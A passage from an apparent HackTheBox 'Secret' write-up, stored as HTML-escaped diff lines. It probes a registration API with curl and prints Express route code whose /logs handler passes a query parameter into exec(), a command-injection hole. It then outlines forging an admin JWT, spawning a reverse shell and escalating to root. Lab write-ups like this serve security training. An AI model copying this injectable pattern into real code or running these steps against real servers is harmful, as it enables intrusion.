+{
+	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;legiahuyy&amp;#34;&lt;/span&gt;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// Response
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;HTTP/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Bad&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Request&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Server:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;nginx/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.18&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(Ubuntu)&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Date:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Wed,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Jan&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;GMT&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Content-Type:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;text/html;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;charset=utf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;-8&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Content-Length:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Connection:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;close&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;X-Powered-By:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Express&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ETag:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;W/&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13-Q2T0jisz/unr9MyMuXKKCS2zU1g&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;required&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And cURL approach as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ curl -i -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; -v 10.10.11.120/api/user/register --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;name&amp;#34;: &amp;#34;legiahuyy&amp;#34;}&amp;#39;&lt;/span&gt; 
+
+*   Trying 10.10.11.120:80...
+* Connected to 10.10.11.120 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.11.120&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; port &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#0)&lt;/span&gt;
+&amp;gt; POST /api/user/register HTTP/1.1
+&amp;gt; Host: 10.10.11.120
+&amp;gt; User-Agent: curl/7.79.1
+&amp;gt; Accept: */*
+&amp;gt; Content-Type: application/json
+&amp;gt; Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;
+&amp;gt; 
+* Mark bundle as not supporting multiuse
+&amp;lt; HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+&amp;lt; Server: nginx/1.18.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Server: nginx/1.18.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&amp;lt; Date: Wed, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 15:23:38 GMT
+Date: Wed, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 15:23:38 GMT
+&amp;lt; Content-Type: text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;utf-8
+Content-Type: text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;utf-8
+&amp;lt; Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;
+Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;
+&amp;lt; Connection: keep-alive
+Connection: keep-alive
+&amp;lt; X-Powered-By: Express
+X-Powered-By: Express
+&amp;lt; ETag: W/&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&amp;#34;&lt;/span&gt;
+ETag: W/&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&amp;#34;&lt;/span&gt;
+
+&amp;lt; 
+* Connection &lt;span style=&#34;color:#75715e&#34;&gt;#0 to host 10.10.11.120 left intact&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt; is required                                                                      
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Evidently, &lt;code&gt;/api/user/register&lt;/code&gt; is a valid API endpoint and thus enables us to register a new user. Next, we want access to the two &lt;code&gt;/api/priv&lt;/code&gt; and &lt;code&gt;/api/logs&lt;/code&gt; route and it is feasible by modifying our user to &lt;code&gt;theadmin&lt;/code&gt; as in &lt;code&gt;private.js&lt;/code&gt;. Have a try spotting the vulnerable function in this code snippet.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Router&lt;/span&gt;();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verifytoken&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./verifytoken&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../model/user&amp;#39;&lt;/span&gt;);
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/priv&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;verifytoken&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
+   &lt;span style=&#34;color:#75715e&#34;&gt;// res.send(req.user)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; }
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;;
+    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;theadmin&amp;#39;&lt;/span&gt;){
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;creds&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;{
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;, 
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;theadmin&amp;#34;&lt;/span&gt;,
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;desc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;welcome back admin,&amp;#34;&lt;/span&gt;
+            }
+        })
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you are normal user&amp;#34;&lt;/span&gt;,
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;desc&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;
+            }
+        })
+    }
+})
+
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/logs&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;verifytoken&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;;
+    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;theadmin&amp;#39;&lt;/span&gt;){
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getLogs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`git log --oneline &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getLogs&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; , &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;) =&amp;gt;{
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;){
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+            }
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;);
+        })
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you are normal user&amp;#34;&lt;/span&gt;,
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;desc&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;
+            }
+        })
+    }
+})
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
+
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404 page not found&amp;#34;&lt;/span&gt;,
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;desc&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;page you are looking for is not found. &amp;#34;&lt;/span&gt;
+        }
+    })
+});
+
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to impersonate a privileged account, we have to know the aforementioned JWT secret key. Hence, our objectives:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Register a new user credentials&lt;/li&gt;
+&lt;li&gt;Use the secret key to impersonate &lt;code&gt;theadmin&lt;/code&gt; then access &lt;code&gt;/logs&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Abuse &lt;code&gt;exec&lt;/code&gt; and spawn a reverse shell&lt;/li&gt;
+&lt;li&gt;Leverage to &lt;code&gt;root&lt;/code&gt; and read the flag file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;stage-1-commits-history-and-jwt-secret-key&#34;&gt;Stage 1: Commits history and JWT secret key&lt;/h3&gt;
+&lt;p&gt;Since we have already known that &lt;code&gt;/api/user/register&lt;/code&gt; allows us to register any users as long as they are not duplicated, so let us send a POST request but this time, our request body must meet the required fields which consists of &lt;code&gt;email&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;// Request
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /api/user/register &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.11.120&lt;/span&gt;
+User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&lt;/span&gt;
+Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.5&lt;/span&gt;
+Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
+Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/json&lt;/span&gt;
+Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+If-None-Match&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;W/&amp;#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&amp;#34;&lt;/span&gt;
+Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;
+
+{
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;legiahuyy&amp;#34;&lt;/span&gt;,
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;legiahuyy@email.com&amp;#34;&lt;/span&gt;,
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;legiahuyy&amp;#34;&lt;/span&gt;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// Expected response
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;HTTP/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;OK&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Server:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;nginx/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.18&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(Ubuntu)&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Date:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Sat,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Jan&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;GMT&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Content-Type:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;application/json;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;charset=utf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;-8&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Content-Length:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Connection:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;close&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;X-Powered-By:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Express&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ETag:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;W/&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;14-5u6aWsQRyEf6xmQ3npU9EV403v8&amp;#34;&lt;/span&gt;
+
+{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;legiahuyy&amp;#34;&lt;/span&gt;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we do the same to &lt;code&gt;/api/user/login&lt;/code&gt; and feed it with the new credentials&lt;/p&gt;
